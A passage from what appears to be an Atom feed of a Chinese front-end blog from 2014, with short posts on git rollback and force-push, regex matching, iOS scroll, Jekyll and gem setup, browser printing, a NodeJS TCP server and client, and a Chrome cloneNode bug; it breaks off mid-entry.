        <content type="html"><![CDATA[<p>今天 github 上操作遇到了一个很头疼的问题，在某个文件中进行了误操作（有可能是加入了BOM头），diff 没看到差异，但是线上就是不正常显示。修改半天没用，只要回退版本。</p><p>通过 <code>git log</code> 可以查看近期 commit 的信息：</p><pre><code>commit bcdfd65ba3f16a0647e7687f92cca25d51738d2eAuthor: Barret Lee &lt;barret.china@gmail.com&gt;Date:   Mon Apr 28 01:22:27 2014 +0800    now postcommit 69eeaa60c5808c143aabce4d52feb104e2e4591bAuthor: Barret &lt;barret.china@gmail.com&gt;Date:   Sat Apr 26 21:03:48 2014 +0800    fix bugcommit b9e4b8c697d139ec35e17be7dd353f1338e9b92eAuthor: Jing Lee &lt;barret.china@gmail.com&gt;Date:   Sat Apr 26 19:35:37 2014 +0800    Update atom.xml    </code></pre><p>commit 后面的一串字符就是 SHA 字符。</p><pre><code>git reset --hard SHA  </code></pre><p>这句命令可以回退到指定版本。不过上传的时候要注意了，如果你是：</p><pre><code>git push -u master origin</code></pre><p>肯定会出现这样的错误提示：</p><pre><code>error: failed to push some refs to &#39;//github.com/barretlee/barretlee.github.io.git&#39;hint: Updates were rejected because the tip of your current branch is behindhint: its remote counterpart. Integrate the remote changes (e.g.hint: &#39;git pull ...&#39;) before pushing again.hint: See the &#39;Note about fast-forwards&#39; in &#39;git push --help&#39; for details.</code></pre><p>原因是你本地版本要落后于服务器上的版本（git reset 回退了嘛），如果想覆盖服务器上版本，应该加 <code>-f</code> ，强制提交，</p><pre><code>git push -u master origin -f</code></pre><p>不过这样的操作要谨慎了，先把修改的位置备份（拿出来，复制到文件夹外），完成上述操作之后再复制回来处理。</p>]]></content>
      
      
      <categories>
          
          <category> 前端杂烩 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> git </tag>
            
            <tag> CMS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>当正则匹配零个字符</title>
      <link href="/blog/2014/04/28/reg-match-null/"/>
      <url>/blog/2014/04/28/reg-match-null/</url>
      
        <content type="html"><![CDATA[<pre><code>&quot;something&quot;.match(/\s*(.*?)\s*/)&gt; [&#39;&#39;, &#39;&#39;]&quot;something&quot;.match(/^\s*(.*?)\s*$/)&gt; [&quot;something&quot;, &quot;something&quot;]</code></pre><p>为何前者匹配的结果为空？</p><p>如果你不清楚正则的贪婪模式和非贪婪模式，请先移步<a href="http://www.cnblogs.com/hustskyking/p/how-regular-expressions-work.html#p-2.2">这里</a>.</p><p>整个匹配分为三步：</p><ol><li>第一个 \s*, 贪婪模式把字符全部吞掉，然后回溯，直到第一个字符任然没找到</li><li>第二步是 .*? 由于是非贪婪模式匹配了一个字符就结束了，继续第三步</li><li>第三步匹配失败，回溯到第二步，那第二步会继续减少吞掉的字符，于是字符数缩减到零。</li></ol><p>可能这么说还是不太清晰，先看看这个对比：<br><img src="/../blogimgs/2014/04/28/7e6c1076-cecb-11e3-823e-640e1b53ca00.jpg" alt="qq20140428195101"><!--<source src="https://cloud.githubusercontent.com/assets/2698003/2816541/7e6c1076-cecb-11e3-823e-640e1b53ca00.jpg">--></p><p>关于返回结果不是 null 而是 “”，你可以理解为匹配到了零个 a。</p>]]></content>
      
      
      <categories>
          
          <category> JavaScript </category>
          
          <category> 前端杂烩 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 正则 </tag>
            
            <tag> JavaScript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>IOS边缘回弹的禁止</title>
      <link href="/blog/2014/04/27/IOS-doc-scroll/"/>
      <url>/blog/2014/04/27/IOS-doc-scroll/</url>
      
        <content type="html"><![CDATA[<p>IOS的浏览器里头，文档滚到顶部或者底部，还是可以继续滚动，对于全屏的应用来说，这个多余的体验是十分不好的。如下：</p><img src="https://cloud.githubusercontent.com/assets/2698003/2810913/958be2f6-cdf2-11e3-8266-4adf0ab7da7d.jpg" /><p>比较靠谱的方式是：</p><pre><code>document.addEventListener(&quot;touchmove&quot;, function(evt)&#123;  evt.preventDefault();&#125;, true);</code></pre><p>禁用 touchmove，方法很靠谱，不过还是谨慎点用。呵呵。</p>]]></content>
      
      
      <categories>
          
          <category> JavaScript </category>
          
          <category> 前端杂烩 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> IOS </tag>
            
            <tag> touchmove </tag>
            
            <tag> scroll </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Ubuntu下Rhythmbox mp3音乐乱码</title>
      <link href="/blog/2014/04/27/filename-messy-code/"/>
      <url>/blog/2014/04/27/filename-messy-code/</url>
      
        <content type="html"><![CDATA[<p>linux系统遇到点乱码问题是很正常的，你碰到的问题，别人一般会已经碰到过，甚至已经有了很好的解决方案。</p><p>今天遇到的问题是：Rhythmbox mp3音乐乱码</p><p>处理方案：</p><pre><code>sudo vim /etc/profile  # 类似 windows 下的环境变量# 添加export GST_ID3_TAG_ENCODING=GBK:UTF-8:GB18030export GST_ID3V2_TAG_ENCODING=GBK:UTF-8:GB18030</code></pre><p><img src="/../blogimgs/2014/04/27/cd93a704-ce17-11e3-9b5d-a00b8c0f6c03.jpg" alt="Rhythmbox mp3音乐乱码"><!--<source src="https://cloud.githubusercontent.com/assets/2698003/2811361/cd93a704-ce17-11e3-9b5d-a00b8c0f6c03.jpg">--></p><p>重启电脑，没想到不用重启的方法，<code>source ~/.profile</code> 没效果。</p>]]></content>
      
      
      <categories>
          
          <category> 杂物间 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> messy </tag>
            
            <tag> 乱码 </tag>
            
            <tag> Ubuntu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>jekyll安装不了？</title>
      <link href="/blog/2014/04/27/ruby-jekyll-install/"/>
      <url>/blog/2014/04/27/ruby-jekyll-install/</url>
      
        <content type="html"><![CDATA[<p>1、安装Ruby</p><pre><code>sudo apt-get install ruby1.9.1-dev</code></pre><p>2、安装Jekyll</p><pre><code>sudo gem install jekyll</code></pre><p>3、安装rake(用来可以生成markdown文件)</p><pre><code>sudo gem install rake</code></pre><p>注意几点：</p><ul><li>不是安装 ruby，而是 ruby-dev</li><li>安装 jekyll 之前应该先安装 rdoc</li></ul><figure class="highlight cmake"><table><tr><td class="code"><pre><span class="line">sudo gem <span class="keyword">install</span> rdoc</span><br></pre></td></tr></table></figure><ul><li>关于gem的下载速度，查看<a href="/2014/04/27/gem-sources">这篇文章</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 前端杂烩 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> jekyll </tag>
            
            <tag> ruby </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>gem速度慢</title>
      <link href="/blog/2014/04/27/gem-sources/"/>
      <url>/blog/2014/04/27/gem-sources/</url>
      
        <content type="html"><![CDATA[<p>删除本来的源，添加淘宝的源。</p><p>1 查看源</p><pre><code>gem sources list</code></pre><p>2 删除list中的源</p><pre><code>gem sources --remove http://rubygems.org/</code></pre><p>3 查看是否已经删除</p><pre><code>重复1,结果为空就正确</code></pre><p>4 添加淘宝的源</p><pre><code>gem sources -a http://ruby.taobao.org/</code></pre>]]></content>
      
      
      <categories>
          
          <category> 杂物间 </category>
          
          <category> 网络交互 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ruby </tag>
            
            <tag> gem </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>jekyll中gsub未定义的错误</title>
      <link href="/blog/2014/04/26/gsup-error-in-atom-file/"/>
      <url>/blog/2014/04/26/gsup-error-in-atom-file/</url>
      
        <content type="html"><![CDATA[<p>今天被 jekyll 编译时的一个问题搞疯了。</p><blockquote><p>Liquid Exception: undefined method &#96;gsub’ for nil:NilClass in atom.xml</p></blockquote><p>上面这个错误，开始以为时jekyll的版本问题，后来又以为时 UIT8 编码错误，再继续折腾，看了很多博客还是没有处理好。</p><p>在 <code>atom.xml</code> 中我写了一句 ，以前一直是这样的啊，没报错。不知道 github pages 的后台 jekyll 编译器是不是做了版本或者其他方面的修改，定位到这个位置之后，把内容改成了</p><pre><code>\&#123;\&#123; post.excerpt &#125;&#125;\&#123;\&#123; post.content &#125;&#125; # 改成这个也可以，只是内容太多，我不喜欢</code></pre><p>差不多整了我两个小时，这么点小错误，妹的！</p>]]></content>
      
      
      <categories>
          
          <category> 前端杂烩 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> error </tag>
            
            <tag> jekyll </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>clip的安装和使用</title>
      <link href="/blog/2014/04/26/clip-in-sys/"/>
      <url>/blog/2014/04/26/clip-in-sys/</url>
      
        <content type="html"><![CDATA[<p>很多情况下我们需要复制整个文件的内容，然后粘贴到其他地方，像我这种命令行控，文件操作基本都是命令行处理的，平时会用 vim 打开文件，然后</p><pre><code>vim FILE # 打开文件ggVG # 全选内容&quot;+y  # 复制到系统缓冲区</code></pre><p>说实话，这真的很麻烦，其实我们可以这样：</p><pre><code># windows用户clip &lt; FILEecho &quot;content&quot; | clip# linux用户xclip -sel clip &lt; FILE</code></pre><p>省去了打开文件复制的过程。</p>]]></content>
      
      
      <categories>
          
          <category> JavaScript </category>
          
          <category> 前端杂烩 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tips </tag>
            
            <tag> clip </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>jekyll编译时报错invalid byte sequence in GBK</title>
      <link href="/blog/2014/04/26/jekyll-error-when-compile/"/>
      <url>/blog/2014/04/26/jekyll-error-when-compile/</url>
      
        <content type="html"><![CDATA[<p>找到你的Ruby安装目录，如我的是：D:\Ruby193, 在里面找到文件D:\Ruby193\lib\ruby\gems\1.9.1\gems\jekyll-0.12.0\lib\jekyll\convertible.rb<br>在该文件中找到下面句子：</p><pre><code># Returns nothing.    def read_yaml(base, name)      self.content = File.read(File.join(base, name))  </code></pre><p>将它修改为：</p><pre><code># Returns nothing.    def read_yaml(base, name)      self.content = File.read(File.join(base, name),:encoding=&gt;&quot;utf-8&quot;)  </code></pre><p>然后确保所有带中文字符的markdown文件是无BOM的UTF-8格式即可。</p>]]></content>
      
      
      <categories>
          
          <category> 前端杂烩 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> error </tag>
            
            <tag> jekyll </tag>
            
            <tag> ruby </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>巧妙交换值</title>
      <link href="/blog/2014/04/26/replace-a-and-b/"/>
      <url>/blog/2014/04/26/replace-a-and-b/</url>
      
        <content type="html"><![CDATA[<pre><code>a = 1, b = 2;a = [b, b = a][0];a // 2b // 1</code></pre><p>很巧妙的替换了 a 和 b 的值。</p>]]></content>
      
      
      <categories>
          
          <category> JavaScript </category>
          
          <category> 前端杂烩 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hack </tag>
            
            <tag> tips </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>打印</title>
      <link href="/blog/2014/04/25/window-print/"/>
      <url>/blog/2014/04/25/window-print/</url>
      
        <content type="html"><![CDATA[<p>打印的常用的几种方式：</p><h3 id="1-open新页面打印"><a href="#1-open新页面打印" class="headerlink" title="1. open新页面打印"></a>1. open新页面打印</h3><pre><code>var childWin = window.open(&quot;about:blank&quot;);childWin.document.body.innerHTML = document.body.innerHTML;// code... // 操作（修改/隐藏/添加）内容childWin.print();</code></pre><h3 id="2-iframe中打印"><a href="#2-iframe中打印" class="headerlink" title="2. iframe中打印"></a>2. iframe中打印</h3><pre><code>var ifr = document.createElement(&quot;iframe&quot;);ifr.src = &quot;about:blank&quot;;ifr.style.display = &quot;none&quot;;document.body.appendChild(ifr);var win = ifr.contentWindow;win.document.body.innerHTML = document.body.innerHTML;// code... // 操作（修改/隐藏/添加）内容win.print();</code></pre><h3 id="3-本页打印"><a href="#3-本页打印" class="headerlink" title="3. 本页打印"></a>3. 本页打印</h3><pre><code>var oldHTML = document.body.innerHTML;// code... // 操作（修改/隐藏/添加）内容window.print();// 完了之后document.body.innerHTML = oldHTML;</code></pre>]]></content>
      
      
      <categories>
          
          <category> JavaScript </category>
          
          <category> 前端杂烩 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> print </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>深入浅出NodeJS——数据通信，NET模块运行机制</title>
      <link href="/blog/2014/04/22/cb-nodejs-net-module/"/>
      <url>/blog/2014/04/22/cb-nodejs-net-module/</url>
      
        <content type="html"><![CDATA[<p>互联网的运作，最根本的驱动就是信息的交互，NodeJS 在数据交互这一块做的很带感，异步编程让人很惬意，关于 NodeJS 的数据通信，最基础的两个模块是 NET 和 HTTP，前者是基于 TCP 的封装，后者本质还是 TCP 层，只不过做了比较多的数据封装，我们视之为更高层。</p><p>本文先述说 NodeJS 的 NET 模块工作机制，下次再谈一谈 HTTP 模块。</p><p>本文地址：<a href="http://www.cnblogs.com/hustskyking/p/nodejs-net-module.html">http://www.cnblogs.com/hustskyking/p/nodejs-net-module.html</a>，转载请注明源地址。</p><h3>一、服务器和客户端之间的交互</h3><p>NodeJS 底层支撑是 <a href="http://en.wikipedia.org/wiki/V8_engine" target="_blank">v8</a>，v8 是用 C++ 编写的一个编译和运行 JavaScript 代码的库，说到 TCP/UDP，写 C/C++ 的童鞋肯定不会感到陌生，在建立 socket 连接的时候，基本都会涉及到相关的知识。</p><p>这里先解释下服务器端和客户端之间的一些共性和差异。关于数据交互，我们可以想象成，Server 与 Client 之间建立了一个管道（pipe），这个管道有两个分支，一个是用于发送 S 到 C 的数据，一个是用于发送 C 到 S 的数据。那么这个管道是如何建立的呢？</p><p>首先，Server 监听本地的某个端口（所谓端口，可以理解成对外交流的摊铺），Client 很明确自己要跟谁去交流，他去访问 Server 的那个摊铺，于是两者之间就可以沟通了。所以 Server 跟 Client 之间的差异是十分明显的，Server 会监听端口，而 Client 去访问端口。</p><p>Unix/Linux 系统跟 windows 有些不同，他可以去监听端口，也可以去监听文件，也就是说他可以把端口和文件都当做对外交流的摊铺。那么 Client 可以通过访问一个文件与 Server 建立起 pipe。</p><h3>二、Node 如何开启一个 TCP 服务器</h3><p>在电脑上安装好了 Node 之后，我们就可以引用 Node 提供的模块，Node 内置了很多模块，如文件处理（FireSystem）、控制台（Console）、数据流（Stream）等等，这些我会在以后的文章中提到。建立 TCP 连接需要用到的是 Node 的 NET 模块。使用一个模块十分简单：</p><figure class="highlight ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">var net</span> = require(<span class="string">&#x27;net&#x27;</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>net</code> 是一个系统模块，也就是安装 Node 之后自带的模块，没必要对他感到畏惧，其实他的内部也是十分简单的：</p><figure class="highlight abnf"><table><tr><td class="code"><pre><span class="line">var Net <span class="operator">=</span> function()&#123;&#125;<span class="comment">;</span></span><br><span class="line"></span><br><span class="line">Net.methodA <span class="operator">=</span> function ()&#123;&#125;<span class="comment">;</span></span><br><span class="line">Net.methodB <span class="operator">=</span> function ()&#123;&#125;<span class="comment">;</span></span><br><span class="line"></span><br><span class="line">module.exports <span class="operator">=</span> Net<span class="comment">;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>我们可以简单理解 net 模块的内部实现，他就是一个 Net 类，上面绑定了很多的 methods，require 之后，相当于返回一个 Net 类，此时我们就可以尽情使用 Net 中定义的所有方法和属性了。</p><p>Node 中开启一个 TCP 服务器：</p><figure class="highlight arcade"><table><tr><td class="code"><pre><span class="line"><span class="comment">// server.js</span></span><br><span class="line"><span class="keyword">var</span> net = require(<span class="string">&#x27;net&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> server = net.createServer(<span class="keyword">function</span>(<span class="params">socket</span>) &#123; <span class="comment">//&#x27;connection&#x27; listener</span></span><br><span class="line">    <span class="built_in">console</span>.<span class="built_in">log</span>(<span class="string">&#x27;server connected&#x27;</span>);</span><br><span class="line">    socket.on(<span class="string">&#x27;end&#x27;</span>, <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="built_in">console</span>.<span class="built_in">log</span>(<span class="string">&#x27;server disconnected&#x27;</span>);</span><br><span class="line">    &#125;);</span><br><span class="line">    socket.on(<span class="string">&#x27;data&#x27;</span>, <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        socket.end(<span class="string">&#x27;hello\r\n&#x27;</span>);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br><span class="line">server.listen(<span class="number">8124</span>, <span class="keyword">function</span>(<span class="params"></span>) &#123; <span class="comment">//&#x27;listening&#x27; listener</span></span><br><span class="line">    <span class="built_in">console</span>.<span class="built_in">log</span>(<span class="string">&#x27;server bound&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>上面这段代码应该很好理解，首先 <code>net.createServer</code> 创建一个 TCP 服务，这个服务绑定（server.listen）在 8124 这个端口上，创建 Server 后我们看到有一个回调函数，这个回调函数的实现方式是怎么样的呢？</p><figure class="highlight actionscript"><table><tr><td class="code"><pre><span class="line">net.createServer = <span class="keyword">function</span><span class="params">(callback)</span>&#123;</span><br><span class="line">    <span class="comment">// 每次客户端连接都会新建一个 socket</span></span><br><span class="line">    <span class="keyword">var</span> socket = <span class="keyword">new</span> Socket();</span><br><span class="line">    callback &amp;&amp; callback(socket);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>在调用上面函数的时候传入一个参数，这个参数也是函数，并且接受了 socket ，这个由其他方法构造的一个管道（pipe），他的作用就是用来数据交互的。第一节中我们说到了，pipe 是需要 Client 跟 Server 打招呼才能建立的，如果此刻没有客户端访问 Server，这个 socket 就不会存在了。</p><h3>三、写一个客户端程序与服务器交互</h3><p>既然 Socket ，也就是管道（pipe）还没有存在，那肯定是不会存在通讯的，下面来写一个客户端程序：</p><figure class="highlight arcade"><table><tr><td class="code"><pre><span class="line"><span class="comment">// client.js</span></span><br><span class="line"><span class="keyword">var</span> net = require(<span class="string">&quot;net&quot;</span>);</span><br><span class="line"><span class="keyword">var</span> client = net.connect(&#123;<span class="attr">port</span>: <span class="number">8124</span>&#125;, <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="built_in">console</span>.<span class="built_in">log</span>(<span class="string">&#x27;client connected&#x27;</span>);</span><br><span class="line">    client.write(<span class="string">&#x27;world!\r\n&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line">client.on(<span class="string">&#x27;data&#x27;</span>, <span class="keyword">function</span>(<span class="params">data</span>) &#123;</span><br><span class="line">    <span class="built_in">console</span>.<span class="built_in">log</span>(data.toString());</span><br><span class="line">    client.end();</span><br><span class="line">&#125;);</span><br><span class="line">client.on(<span class="string">&#x27;end&#x27;</span>, <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="built_in">console</span>.<span class="built_in">log</span>(<span class="string">&#x27;client disconnected&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>net.connect</code> 顾名思义，就是连接到服务端，第一个参数是对象，设置端口（port）为 8124，也就是我们服务器监听的端口，由于没有设置 host 参数，那默认就是 localhost （本地）。在 Server 中，socket 是管道的一端，而在 client 中，client 本身就是管道的一端，如果是多个客户端连接 Server，Server 会新建多个 socket，每个 socket 对应一个 client。</p><p>数据的通信就十分简单了，首先运行服务器程序：</p><figure class="highlight crmsh"><table><tr><td class="code"><pre><span class="line"><span class="keyword">node</span> <span class="title">server</span>.js</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>此时便会有一个服务器监听 8124 端口，然后打开一个客户端程序：</p><figure class="highlight crmsh"><table><tr><td class="code"><pre><span class="line"><span class="keyword">node</span> <span class="title">client</span>.js</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>那么两者之间的信息交互就开始了。具体他们是怎么交流的呢？</p><h3>四、基于事件的哲学</h3><p>首先我们要说一说 NodeJS 的 EventEmitter 模块。这个模块就是一个事件中心，之前写过相关的内容，可以看看简介版的 EventEmitter，<a href="http://www.cnblogs.com/hustskyking/p/how-to-achieve-loading-module.html#p-2" target="_blank">戳我</a>。EventEmitter 也就是如此，可以 on 添加事件到事件池，也可以 trigger 触发事件，当然可以从事件池中删除事件 off。</p><p>NET 模块是继承 EventEmitter 的，所以他创建的很多对象可以：</p><figure class="highlight arcade"><table><tr><td class="code"><pre><span class="line">client.on(<span class="string">&#x27;data&#x27;</span>, <span class="keyword">function</span>(<span class="params">data</span>) &#123;</span><br><span class="line">    <span class="built_in">console</span>.<span class="built_in">log</span>(data.toString());</span><br><span class="line">    client.end();</span><br><span class="line">&#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>如上绑定很多自定义的事件，等到交互中需要信息交流的时候再触发。就拿上面这句代码来说，client 绑定了一个 data 事件，这个事件会在 Server 有信息传过来的时候触发，他所做的工作，先打印传过来的数据，然后 end() 关闭这个管道（pipe）。</p><p>JavaScript 是基于事件的一门语言，几乎所有的动作都是由事件驱动的，这个在异步编程中显得十分突出。</p><h3>五、相关 API 的枚举</h3><p>Server 除了有 listen 函数外，还有很多的接口：</p><ul><li><code>Server.close([callback])</code>，停止监听，那么之前的所有管道也就没有用了。</li><li><p><code>Server.maxConnections</code>，Server 的最大连接数，这个连接数是有上限的（跟系统有关），我们也可以自己设定连接数的最大上限（不超过系统最大连接数）。</p></li><li><p><code>Server.address()</code>，在 listen 之后可以通过这个函数拿到服务器的相关信息。</p><figure class="highlight arcade"><table><tr><td class="code"><pre><span class="line"><span class="comment">// grab a random port. </span></span><br><span class="line">server.listen(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    address = server.address();</span><br><span class="line">    <span class="built_in">console</span>.<span class="built_in">log</span>(<span class="string">&quot;opened server on %j&quot;</span>, address);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure></li></ul><p>还有 write、end、destroy、pause、resume 等等很多丰富的接口，可以在这里查看详情<a href="http://nodejs.org/api/net.html" target="_blank">http://nodejs.org/api/net.html</a>。</p><h3>六、小结</h3><p>本来打算写一个聊天室，但是这种简单的代码网络上俯拾皆是，本文目的是说清楚 TCP 连接在服务器和客户端之间的交互过程，深入的话题留到下次谈。</p><h3>七、参考资料</h3><ul><li><a href="http://nodejs.org/api/net.html" target="_blank">http://nodejs.org/api/net.html</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> JavaScript </category>
          
          <category> 前端杂烩 </category>
          
          <category> 网络交互 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tech </tag>
            
            <tag> cnblogs </tag>
            
            <tag> NodeJS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>cloneNode/importNode Bug in Old Chrome</title>
      <link href="/blog/2014/04/21/clonenode-bug-in-old-chrome/"/>
      <url>/blog/2014/04/21/clonenode-bug-in-old-chrome/</url>
      
        <content type="html"><![CDATA[<pre><code>support.checkClone = div.cloneNode(true).cloneNode(true).lastChild.checked;</code></pre><p>有人问：为什么需要 cloneNode 两次呀？</p><p>这是老版 chrome 内部实现的一个 bug，这个 bug 在四年前就提出来了，cloneNode 和 importNode 没法保存片段代码中表单元素诸如 value&#x2F;checked 之类的属性。</p><p>解决方案是：将 cloneNode 拿到的代码片段在 clone 一次。如同 IE6 下浮动元素 margin 的渲染，是 IE6 的 bug，通过设置 inline 可以解决。</p><ul><li>Bug 地址：<a href="http://bugs.webkit.org/show_bug.cgi?id=6617">http://bugs.webkit.org/show_bug.cgi?id=6617</a></li><li>Bug 测试源码：<a href="//webkit.googlesource.com/WebKit/+/a847461eedf68a16e2d2491447608ea3bf9d7890/LayoutTests/fast/dom/clone-node-form-elements-with-attr.html">link</a></li><li>JQ中对这个 bug 的阐述：<a href="http://bugs.jquery.com/ticket/5832">http://bugs.jquery.com/ticket/5832</a></li><li>JQ对这个bug 的处理：<a href="http://bugs.jquery.com/ticket/5929">http://bugs.jquery.com/ticket/5929</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> JavaScript </category>
          
          <category> 前端杂烩 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> bug </tag>
            
            <tag> chrome </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>array 不等于 array</title>
      <link href="/blog/2014/04/20/valueof-and-tostring/"/>
      <url>/blog/2014/04/20/valueof-and-tostring/</url>
      
        <content type="html"><![CDATA[<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line"><span class="selector-attr">[]</span> == !<span class="selector-attr">[]</span> <span class="comment">// true</span></span><br></pre></td></tr></table></figure><p>其实这个问题没啥好讨论的，ECMA-262看看就知道了。不过很多人问，就做个笔记。</p><p>前面那个 [] 在解析的时候调用的是 valueOf 返回的结果是 ‘’<br>后面那个取反运算，对 NAN undefined null “” 0 取反结果才会是true，所以 ![] 的结果是 false</p><p>左边是 ‘’ ，右边是 false，答案是什么一目了然了。</p><p>具体可以看看：<a href="http://barretlee.com/demo/ST/ES5.1/#sec-11.9.3">http://barretlee.com/demo/ST/ES5.1/#sec-11.9.3</a></p>]]></content>
      
      
      <categories>
          
          <category> JavaScript </category>
          
          <category> 前端杂烩 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hack </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>换个标签写前端模板</title>
      <link href="/blog/2014/04/13/cb-javascript-template-tag/"/>
      <url>/blog/2014/04/13/cb-javascript-template-tag/</url>
      
        <content type="html"><![CDATA[<p>前端模板中，我们通常使用 script/textarea 来存放模板代码，然后使用 innerHTML/value 属性来获取模板内容进行解析和拼装。</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/x-template&quot;</span> <span class="attr">id</span>=<span class="string">&quot;tpl&quot;</span>&gt;</span><span class="language-handlebars"><span class="language-xml"></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>&lt;%=data.title%&gt;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>&lt;%=data.content%&gt;<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars"></span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> htmlTpl = <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;tpl&quot;</span>).<span class="property">innerHTML</span>;</span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">tplEngine</span>(htmlTpl, &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">title</span>: <span class="string">&quot;This is title&quot;</span>,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">content</span>: <span class="string">&quot;This is content&quot;</span></span></span><br><span class="line"><span class="language-javascript">    &#125;);</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>关于 tplEngine 这个 Javascript 模板引擎，之前也写了篇 <a href="http://www.cnblogs.com/hustskyking/p/principle-of-javascript-template.html" target="_blank">文章</a> 介绍过，这里就不赘述了。除了使用 script 标签，textarea 也可以达到同样的效果，但是本文叙述的重点并不是如何去解析一个 JavaScript 模板。</p><p>W3C工作组在 HTML 中加入了一个新的标签 &mdash;&mdash;TEMPLATE。他提供了一个可以定义 HTML 代码片段的机制，下面就来详细说说这个 TEMPLATE 标签。</p><p>本文地址：http://www.cnblogs.com/hustskyking/p/javascript-template-tag.html，转载请注明源地址。</p><h3>一、先看 DEMO</h3><p>运行下面的 demo，或许你已经知道了一些东西了。</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">ul</span> <span class="attr">id</span>=<span class="string">&quot;list&quot;</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- TEMPLATE 模板 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">template</span> <span class="attr">id</span>=<span class="string">&quot;tpl&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span> - <span class="tag">&lt;<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">template</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">id</span>=<span class="string">&quot;btn&quot;</span>&gt;</span>见证奇迹的时刻→<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> datas = [</span></span><br><span class="line"><span class="language-javascript">        &#123;<span class="attr">name</span>:<span class="string">&quot;李靖&quot;</span>, <span class="attr">age</span>:<span class="string">&quot;21&quot;</span>&#125;,</span></span><br><span class="line"><span class="language-javascript">        &#123;<span class="attr">name</span>:<span class="string">&quot;Barret Lee&quot;</span>, <span class="attr">age</span>:<span class="string">&quot;21&quot;</span>&#125;</span></span><br><span class="line"><span class="language-javascript">    ];</span></span><br><span 